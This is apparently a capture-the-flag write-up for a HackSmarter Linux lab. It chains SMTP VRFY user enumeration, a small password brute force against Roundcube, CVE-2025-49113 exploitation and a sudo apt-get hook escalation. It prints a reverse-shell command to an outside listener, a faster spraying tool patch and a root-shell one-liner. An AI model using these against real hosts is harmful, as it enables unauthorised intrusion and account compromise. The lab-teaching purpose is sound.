---
title: Aftermath
date: 2026-09-10 16:00:00 +0000
categories: [HacksmarterLabs]
tags: [linux, smtp, username-enumeration, password-spraying, bruteforce, web, roundcube, cve, php, deserialization, rce, sudo, privilege-escalation]
media_subpath: /images/hacksmarter_aftermath/
image:
  path: 'https://images.coursestack.com/27b0ac4a-5e03-4e43-afae-7c730b7b6263/e2da119c-5b00-438c-b561-db47aae459c6'
---

## Summary

**Aftermath** is an easy Linux challenge lab on HackSmarter. The starting position is unauthenticated network access to a single host, `10.0.22.182`, plus two files a teammate pulled out of a breach dump and never validated: `names.txt` with 499 first names and `passwords.txt` with 29 passwords. The goal is root, and the client has planted three flags along the way.

The lab is a funnel. Two unvalidated wordlists are worth nothing as a pair, because 499 by 29 is 14,471 combinations against a login form that has no business absorbing that many requests. The whole first half of the box is about collapsing that product into a single pair, and it collapses in two independent steps rather than one. Port 25 is a Postfix instance with `VRFY` still enabled, so the mail server itself will tell you which of the 499 names is a real local account: exactly one of them, `maria`. That reduces the problem to 29 candidate passwords against one known user, which is small enough that a login form is a perfectly reasonable oracle. A content scan on port 80 finds the form: an unlinked Roundcube webmail installation at `/roundcube`. Roundcube answers a successful login with a `302` and a failed one with a `200`, so a short run over the 29-password list lands on `1qaz2wsx`.

The mailbox holds the first flag and, more usefully, the application's own version: Roundcube Webmail 1.5.9, which is inside the range affected by CVE-2025-49113. That bug is a post-authentication PHP object injection, which is precisely why the credentials had to come first: the vulnerability is unreachable without a session, so the SMTP oracle and the CVE are two halves of one step. Exploiting it gives a shell as `www-data`.

The privilege escalation is one command long, and it is one command long because of a single sudoers rule:

- `www-data` may run `/usr/bin/apt-get` as anyone, with no password.
- `apt-get` accepts arbitrary APT configuration on the command line via `-o`.
- `APT::Update::Pre-Invoke` is a list of shell commands that `apt-get update` runs as root before it touches a single repository.
- Setting that hook to `/bin/sh` therefore produces a root shell without any network access, valid sources list, or package download.

The remaining two flags sit at `/usr/user.txt` and `/root/root.txt`.

> **Category:** Linux, unauthenticated start. **Starting position:** network access to `10.0.22.182`, plus an unvalidated 499-name list and a 29-password list. **Goal:** root, and three planted flags. **Theme:** an SMTP `VRFY` oracle turns 499 names into one account, a small spray turns 29 passwords into one credential, a published webmail CVE turns that credential into code execution, and a one-line sudo rule on a package manager turns code execution into root.
{: .prompt-info }

---

## 1. Recon

A full TCP sweep comes back with three ports, and a service scan on those three sets the shape of the whole box:

```bash
export IP=10.0.22.182
nmap -vvv -p 22,25,80 -4 -sVC -Pn -oN nmap $IP
```

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
|   256 a4:f0:03:80:46:18:04:53:47:2e:bf:8d:c1:9e:66:26 (ECDSA)
|   256 ed:38:36:53:81:bf:c3:15:a2:22:d8:cc:49:3c:63:3d (ED25519)
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: kali, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=kali
| Subject Alternative Name: DNS:kali
| Not valid before: 2026-03-02T19:39:52
|_Not valid after:  2036-02-28T19:39:52
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
Service Info: Host:  kali; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three things to carry forward.

The first is the one word in the `smtp-commands` line that decides the next half hour: `VRFY`. Nmap's `smtp-commands` script issues an `EHLO` and prints the extensions the server advertises back, and this Postfix is still offering the address-verification command. Given a list of 499 names and no idea which of them exist, a server that will answer "does this mailbox exist" is worth more than anything on port 80.

The second is what is *not* there. Port 25 accepts mail, but there is no 110, 143, 993 or 995. Mail is being delivered into local mailboxes and there is no externally reachable protocol for reading them, which means any mailbox on this host is only readable through something on port 80. Before a single directory has been enumerated, the web server has a job.

The third is the hostname. The SMTP banner, the certificate `commonName`, and the certificate's `Subject Alternative Name` all say `kali`, and `openssh 8.9p1 Ubuntu 3ubuntu0.13` with `Apache 2.4.52` pins the box to Ubuntu 22.04 rather than to actual Kali. The certificate's `Not valid before` date, `2026-03-02`, is when the box was built, and that date shows up again later inside the mailbox.

---

## 2. SMTP: 499 names into one account

`VRFY` is defined in RFC 5321 as the command that asks a server to confirm a mailbox exists. It predates any notion of the SMTP server being an untrusted surface, and every modern deployment guide says to disable it, which is exactly why finding it enabled is worth acting on.

[smtp-user-enum](https://github.com/cytopia/smtp-user-enum) walks a name list through it:

```bash
/tools/smtp-user-enum/smtp-user-enum -U names.txt $IP 25 -m VRFY
```

```text
Connecting to 10.0.22.182 25 ...
220 kali ESMTP Postfix (Ubuntu)
250 kali
Start enumerating users with VRFY mode ...
[----] kayla      550 5.1.1 <kayla>: Recipient address rejected: User unknown in local recipient table
[----] felix      550 5.1.1 <felix>: Recipient address rejected: User unknown in local recipient table
[----] fleur      550 5.1.1 <fleur>: Recipient address rejected: User unknown in local recipient table
...
[----] kate       550 5.1.1 <kate>: Recipient address rejected: User unknown in local recipient table
[----] herbert    421 4.7.0 kali Error: too many errors
220 kali ESMTP Postfix (Ubuntu)
250 kali
[----] adele      550 5.1.1 <adele>: Recipient address rejected: User unknown in local recipient table
...
[----] flynn      550 5.1.1 <flynn>: Recipient address rejected: User unknown in local recipient table
[----] jason      550 5.1.1 <jason>: Recipient address rejected: User unknown in local recipient table
[----] maria      252 2.0.0 maria
[----] jaden      550 5.1.1 <jaden>: Recipient address rejected: User unknown in local recipient table
[----] ian        550 5.1.1 <ian>: Recipient address rejected: User unknown in local recipient table
```

Two response codes carry the whole result, and neither of them is the `250` that a naive reading of the RFC would expect.

**`550 5.1.1 ... User unknown in local recipient table`** is a definitive negative. Postfix builds a *local recipient table* from the destinations it is configured to accept for, and with the default `smtpd_reject_unlisted_recipient = yes` it rejects anything not in it up front rather than accepting the mail and bouncing it later. On a stock Ubuntu Postfix that table is fed by `local(8)`, whose recipients are the entries of `/etc/passwd` plus `/etc/aliases`. A name that draws a `550` is not a Unix account on this host.

**`252 2.0.0 maria`** is not a confirmation. RFC 5321 defines `252` as "cannot VRFY user, but will accept message and attempt delivery", and Postfix deliberately returns it for every address it is *not* going to reject, precisely so that `VRFY` cannot be used as a clean directory oracle. The trick is that this only removes the positive signal, not the negative one: the `550` is still definitive, so the useful reading is inverted. `maria` is not confirmed to exist. `maria` is the only one of 499 names that was not confirmed to *not* exist, and on a default Postfix that is the same thing.

> A `VRFY` hit on a stock Postfix resolves against the local recipient table, which is `/etc/passwd` plus `/etc/aliases`. That makes it categorically more valuable than a username oracle in a web application: it does not just name a valid application login, it names a valid **Unix account**, which is a candidate for SSH, for `su`, and for every other local authentication surface on the host. If `VRFY` is disabled, `-m RCPT` gets the same answer by starting a real transaction with `MAIL FROM` and reading the response to `RCPT TO`, which Postfix cannot mask the same way.
{: .prompt-tip }

The `421 4.7.0 kali Error: too many errors` lines interrupting the run are not rate limiting in the sense of the tool being detected. Postfix counts protocol errors per connection and closes it when the count passes `smtpd_hard_error_limit`, which defaults to `20`. Every `550` counts as an error, so the connection dies on the 21st name every time. Counting the output confirms it: `kayla` through `kate` is exactly 20 names, and `herbert` gets the hangup. smtp-user-enum reconnects transparently and resumes where it left off, which is why the run completes at all. Reading that `421` as a failed lookup for `herbert` would be a mistake: `herbert` was never tested on that connection, and the tool retries it after reconnecting.

One name out of 499. The password list is now a 29-item problem instead of a 14,471-item one.

---

## 3. The web root, and the application behind it

With the account known, port 80 has to supply somewhere to use it.

```bash
dirsearch -u http://$IP
```

```text
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12295

Target: http://10.0.22.182/

[11:13:22] 200 -    1KB - /index.html
[11:13:31] 400 -   301B - /Office/graph.php#xxe
[11:13:39] 200 -    5KB - /roundcube/index.php

Task Completed
```

Only one of those three lines is real.

`/index.html` is the 1KB static placeholder the nmap `http-title` already reported as `Home`. `/roundcube/index.php` at 5KB is the find, and it lines up exactly with the missing mail ports from the scan: Roundcube is a PHP webmail client that speaks IMAP to a backend, so there *is* an IMAP server on this host, bound to loopback where nmap could not see it. The only path to `maria`'s mailbox runs through this application.

`/Office/graph.php#xxe` is a tooling artifact, and it is worth understanding rather than chasing. It is a literal line in dirsearch's default dictionary:

```bash
DICC=$(python3 -c 'import dirsearch, os; print(os.path.join(os.path.dirname(dirsearch.__file__), "db/dicc.txt"))')
grep -n 'graph.php' "$DICC"
grep -c '#' "$DICC"
```

```text
6698:Office/graph.php#xxe
1
```

That entry is the only one in the entire 9,680-line wordlist containing a `#`. A raw `#` is not valid in an HTTP request target, so Apache rejects the request line with a `400` before it ever looks for a file, and the `400` is generated identically whether or not `/Office/` exists. dirsearch only surfaces it because its default filter hides `404` and shows everything else.

> A status code that is not `404` is not the same thing as a hit. `400`, `403` and `500` each mean the server stopped for its own reasons, and only `403` reliably implies something is there. When a scan produces a single odd code on a single odd-looking path, check the wordlist entry before you build a theory on it.
{: .prompt-tip }

---

## 4. Spraying 29 passwords at one username

Roundcube's login is an ordinary form with CSRF protection, and its behaviour makes a clean oracle:

1. `GET /roundcube/?_task=login` returns the form and sets a `roundcube_sessid` cookie. The page contains `<input type="hidden" name="_token" value="...">`, which must be echoed back.
2. `POST` to the same URL with `_token`, `_user`, `_pass`, `_task=login`, `_action=login`.
3. A **`302`** redirect means the credentials were accepted and the session was upgraded. A **`200`** means the form was redisplayed, which is a failure.

[cubeSpraying](https://github.com/robotshell/cubeSpraying) implements exactly that loop, fetching a fresh token per attempt because the token is bound to the pre-auth session:

```bash
git clone https://github.com/robotshell/cubeSpraying.git /tools/cubeSpraying
```

Out of the box it is slower than the work justifies. It spawns one `threading.Thread` per attempt with a `--timeout` pause between spawns (default `0.5` seconds), but the `join()` sits inside the password loop, so every attempt is effectively serialised behind two round trips to the target. Replacing the hand-rolled threading with a `ThreadPoolExecutor` and exposing a `--threads` flag makes the run finish in seconds:

```diff
-import threading
+from concurrent.futures import ThreadPoolExecutor
+parser.add_argument('--threads', '-T', type=int, default=1, help='Number of concurrent login workers')

-def password_spraying(url, usernames, passwords, timeout):
-    threads = []
-    for password in passwords:
-        for username in usernames:
-            t = threading.Thread(target=try_login, args=(url, username, password))
-            threads.append(t)
-            t.start()
-            time.sleep(timeout)
-
-        for t in threads:
-            t.join()
-        threads = []
+def password_spraying(url, usernames, passwords, timeout, threads):
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = []
+        for password in passwords:
+            for username in usernames:
+                futures.append(executor.submit(try_login, url, username, password))
+                time.sleep(timeout)
+
+        for future in futures:
+            future.result()
```

```bash
uv run --with requests /tools/cubeSpraying/cubeSpraying.py \
  --url http://$IP/roundcube --usernames maria --passwords passwords.txt -T 10 -t 0
```

```text
*************************************************
[SUCCESS] Valid credentials found: maria:1qaz2wsx
*************************************************
```

`1qaz2wsx` is line 18 of the 29-line list: the left-hand two columns of a QWERTY keyboard walked downwards, which is one of the most common patterns in any breach corpus.

> This run is labelled password spraying, but it is not. Spraying means **one** password against **many** accounts, precisely so that no single account accumulates enough failures to trip a lockout. What happened here is 29 passwords against one account, which is a small brute force, and running it at `-T 10 -t 0` means those 29 failures arrive in a burst. That is safe here because the target is a lab and the list is 29 long, and because Roundcube ships with no lockout of its own. Against a real client, 29 rapid failures on a named account is how you lock somebody out of their mail and hand the blue team a trivially alerting event. Had the SMTP step returned twenty valid names instead of one, the correct shape would have been the transpose: one password across all twenty, then the next.
{: .prompt-warning }

---

## 5. The mailbox: one flag and a version number

The credentials go straight into the web client, and the inbox holds exactly one message, from `ctf@localdomain`, dated `2026-03-02`, the same day the SMTP certificate was issued:

![Roundcube inbox showing a single message titled Email Flag, with the flag value blacked out](roundcube-email-flag.png)
_The first of the three planted flags, delivered as local mail and readable only through the webmail client_

That is the first flag, and it is also the justification for the whole SMTP detour: the message was never reachable over the network as mail, only through this application.

The more valuable thing in the interface is under Settings, About:

![Roundcube About dialog reporting Roundcube Webmail 1.5.9 and two installed plugins](roundcube-version-159.png)
_Settings, About: Roundcube Webmail 1.5.9, with `filesystem_attachments` loaded_

Roundcube Webmail **1.5.9**. CVE-2025-49113 affects everything below 1.5.10 on the 1.5 branch and below 1.6.11 on the 1.6 branch, so 1.5.9 is one release short of the fix.

> Prefer the application's own About page over banner guessing when a CVE is version-gated. Roundcube also publishes the version programmatically as `"rcversion":10509` inside the JavaScript configuration object embedded in every page, which is what automated checks parse and what the exploit below reports. `10509` is the encoded form of 1.5.9, the same way `10610` is 1.6.10. The `filesystem_attachments` plugin listed in the same dialog is the one that stores uploaded attachments, which is directly relevant to what comes next.
{: .prompt-tip }

---

## 6. CVE-2025-49113: a webmail login becomes code execution

CVE-2025-49113 is a **post-authentication** PHP object injection in Roundcube's settings file-upload handler. The "post-authentication" qualifier is the reason the first four sections exist: without `maria:1qaz2wsx` the bug is not reachable at all.

In outline: `program/actions/settings/upload.php` takes the `_from` GET parameter without validating it, and the uploaded **filename** ends up inside the session blob. Roundcube does not use PHP's own session handler, it implements its own parser over the `name|serialized_value;` format, and a logic error in that parser lets a `|` inside a value be read as the delimiter that starts a new variable. The exploit therefore sends `_from=edit-!xxx` with a small valid PNG whose filename is `|` plus a serialized object, and the parser instantiates it on the next request. The gadget is `Crypt_GPG_Engine` from the bundled PEAR library, which shells out to `gpgconf` in its destructor using its own `$_gpgconf` property as the command.

Hakai Security, who wrote the proof of concept used here, published the full root-cause analysis: [Behind the Bug: Logic Error in Roundcube Session Parser](https://hakaisecurity.io/behind-the-bug-logic-error-in-roundcube-session-parser-cve-2025-49113/research-blog/). The bug had been in the codebase for over ten years. The destructor-driven half of the pattern, which is common to every PHP object-injection bug regardless of how the object is delivered, is covered on the [PHAR deserialization](/theory/misc/phar-deserialization) page.

Running the [hakaioffsec proof of concept](https://github.com/hakaioffsec/CVE-2025-49113-exploit) with a listener already waiting:

```bash
nc -lnvp 9999
```

```bash
php roundcube_exp.php http://$IP/roundcube maria '1qaz2wsx' 'bash -c "bash -i >& /dev/tcp/10.200.93.17/9999 0>&1"'
```

```text
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10509
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

```text
Listening on 0.0.0.0 9999
Connection received on 10.0.22.182 34722
bash: cannot set terminal process group (834): Inappropriate ioctl for device
bash: no job control in this shell
```

The shell arrives as `www-data`, without job control and without a terminal, which makes the next section's interactive work painful. Upgrading it is worth the four commands:

```bash
which python3
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

Then background the shell with `Ctrl+Z`, hand the local terminal's raw mode over to the remote side, and foreground it again:

```bash
stty raw -echo; fg
export TERM=xterm
```

`pty.spawn` gives the remote process a real pseudo-terminal so it can allocate a controlling TTY and run job control. `stty raw -echo` stops the *local* terminal from interpreting control characters and echoing input, so `Ctrl+C`, arrow keys and tab completion travel to the remote shell instead of being consumed locally. `TERM=xterm` gives remote curses programs a terminfo entry to work against, which is what makes `less`, `vi` and a usable `clear` behave.

---

## 7. www-data to root, in one command

The first thing to run in any new identity, before any enumeration script:

```bash
sudo -l
```

```text
Matching Defaults entries for www-data on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

The `Defaults` block is the hardened default and none of it helps. `env_reset` strips the caller's environment, so there is no `LD_PRELOAD` or `PATH` game to play. `secure_path` overrides `PATH` for the command, so dropping a malicious `apt-get` earlier in the path does nothing. `use_pty` allocates a pseudo-terminal for the command, which is a defence against TTY pushback, not against anything here. Every one of those controls the *environment* the command runs in. None of them constrains what the command is capable of doing once it starts.

And `apt-get` is capable of a great deal. APT's configuration system is a tree of options normally read from `/etc/apt/apt.conf.d/`, and every one of those options can be set on the command line with `-o`. Among them is a family of hooks:

- `APT::Update::Pre-Invoke` is a list of shell commands run **before** `apt-get update` does anything with the configured repositories.
- `APT::Update::Post-Invoke` and `DPkg::Pre-Invoke` are the same idea at other points in the lifecycle.

These are ordinary hooks with a legitimate purpose, and they run with the full privileges of the `apt-get` process. Since sudo starts that process as root, so does the hook. The `::=` form appends to the list rather than replacing it, which is the syntax APT expects for list-valued options:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

The hook fires before APT touches a repository, so this works with no network access, no valid `sources.list`, and no package ever being downloaded. `apt-get update` failing afterwards is irrelevant, because the shell has already been handed over; exiting it simply returns control to `apt-get` to finish failing. This is the [GTFOBins `apt-get` entry](https://gtfobins.github.io/gtfobins/apt-get/), and the same trick works through `apt`, and through `dpkg` via `DPkg::Pre-Invoke`.

The remaining two flags are then a `find` away:

```bash
find / -type f \( -name "user.txt" -o -name "root.txt" \) 2>/dev/null
```

```text
/usr/user.txt
/root/root.txt
```

```bash
cat /usr/user.txt /root/root.txt
```

```text
flag{redacted}
flag{redacted}
```

`/usr/user.txt` is worth noticing: the user flag is not in a home directory, it is dropped directly into `/usr`. A `find` across the filesystem for the filename finds it; a habit of looking in `/home/*/` does not.

---

## Understanding the Attack Chain

Every step in this box is a component doing what it was configured to do, plus one published bug in a version that was never updated. The table separates what each piece is worth alone from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| Breach-dump name list | 499 unvalidated names | None | Input to the SMTP oracle |
| Breach-dump password list | 29 unvalidated passwords | None | Small enough to spray by hand |
| `VRFY` enabled | Postfix `smtpd` | Low: an oracle | 499 names collapse to one |
| `550` on unlisted recipients | `smtpd_reject_unlisted_recipient` | Default hardening | Supplies the negative signal |
| Local recipient table | `/etc/passwd` plus aliases | By design | Hit is a Unix account, not a login |
| `smtpd_hard_error_limit` | Postfix, default 20 | Throttling | Slows the run, does not stop it |
| Unlinked Roundcube 1.5.9 | `/roundcube` | Medium: a login page | The only authenticated surface |
| No lockout on the login form | Roundcube default | Medium | 29 attempts cost nothing |
| `302` vs `200` on login | Roundcube behaviour | None | The spray oracle |
| Reused keyboard-walk password | `maria:1qaz2wsx` | High | Turns a name into a session |
| CVE-2025-49113 | `_from` into `$_SESSION` | Critical post-auth | Session becomes RCE |
| `sudo -l` from `www-data` | Sudoers policy | Information | Discloses the whole privesc |
| `NOPASSWD: /usr/bin/apt-get` | `/etc/sudoers.d` | Looks narrow | Equivalent to `NOPASSWD: ALL` |
| `-o APT::Update::Pre-Invoke` | APT configuration | By design | Root command execution, no network |
| `env_reset` and `secure_path` | Sudo defaults | Real hardening | Irrelevant to a hook-based abuse |
